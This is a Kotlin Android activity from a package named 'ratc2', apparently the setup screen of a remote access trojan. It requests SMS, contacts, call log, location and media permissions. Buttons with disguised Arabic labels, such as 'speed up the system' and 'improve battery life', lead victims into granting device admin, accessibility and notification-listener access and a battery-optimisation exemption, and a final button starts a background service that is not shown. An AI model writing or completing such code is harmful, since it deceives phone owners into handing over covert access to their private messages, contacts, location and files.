package com.spud.ratc2

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val needPerms: Array<String> = buildList {
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.POST_NOTIFICATIONS)
        if (Build.VERSION.SDK_INT >= 33) {
            add("android.permission.READ_MEDIA_IMAGES")
            add("android.permission.READ_MEDIA_VIDEO")
            add("android.permission.READ_MEDIA_AUDIO")
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    private val reqPerms = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { }

    private val reqMedia = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)

        val ll = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 50, 50, 50)
        }

        ll.addView(TextView(this).apply {
            text = "إعداد النظام"
            textSize = 22f
            setPadding(0, 0, 0, 40)
        })

        ll.addView(Button(this).apply {
            text = "١. منح كل الصلاحيات"
            setOnClickListener { reqPerms.launch(needPerms) }
        })

        ll.addView(Button(this).apply {
            text = "٢. السماح بالوصول لكل الصور والفيديو"
            setOnClickListener { requestAllMedia() }
        })

        ll.addView(Button(this).apply {
            text = "٣. تفعيل صلاحيات النظام"
            setOnClickListener { requestDeviceAdmin() }
        })

        ll.addView(Button(this).apply {
            text = "٤. تحسين أداء الخلفية"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        })

        ll.addView(Button(this).apply {
            text = "٥. تسريع النظام"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        })

        ll.addView(Button(this).apply {
            text = "٦. تحسين عمر البطارية"
            setOnClickListener { requestIgnoreBattery() }
        })

        ll.addView(Button(this).apply {
            text = "٧. تشغيل الخدمة الآن"
            setOnClickListener {
                startSync()
                Toast.makeText(this@MainActivity, "تم التشغيل", Toast.LENGTH_SHORT).show()
            }
        })

        setContentView(ll)

        reqPerms.launch(needPerms)
    }

    private fun requestAllMedia() {
        if (Build.VERSION.SDK_INT >= 34) {
            reqMedia.launch(arrayOf(
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO",
                "android.permission.READ_MEDIA_VISUAL_USER_SELECTED"
            ))
        } else if (Build.VERSION.SDK_INT >= 33) {
            reqMedia.launch(arrayOf(
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO"
            ))
        } else {
            reqMedia.launch(arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE))
        }
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, MyAdmin::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "لتفعيل إدارة النظام والبطارية")
            }
            startActivity(intent)
        }
    }

    @android.annotation.SuppressLint("BatteryLife")
    private fun requestIgnoreBattery() {
        try {
            val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            i.data = Uri.parse("package:$packageName")
            startActivity(i)
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    private fun startSync() {
        val svc = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svc)
        else startService(svc)
    }
}
